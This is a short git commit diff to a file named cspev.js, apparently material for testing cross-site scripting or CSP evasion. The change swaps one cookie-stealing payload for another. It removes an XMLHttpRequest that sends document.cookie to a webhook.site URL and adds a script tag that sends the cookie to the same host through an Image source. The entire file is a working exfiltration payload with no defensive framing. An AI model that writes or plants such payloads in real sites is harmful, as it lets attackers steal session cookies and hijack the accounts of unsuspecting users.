8e33102e7eea86e36cbd08c867536992ea1431e9
D-Lesev <106137299+D-Lesev@users.noreply.github.com>
2025-03-16 18:42:45 +0200

    Update cspev.js

--- cspev.js
+++ cspev.js
@@ -1,3 +1,1 @@
-var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://webhook.site/7c57b15e-38bc-40e4-8c23-2fa1ce12599c/?' + document.cookie, true);
-xhttp.send();
+<script>new Image().src="https://webhook.site/7c57b15e-38bc-40e4-8c23-2fa1ce12599c?c="+document.cookie;</script>
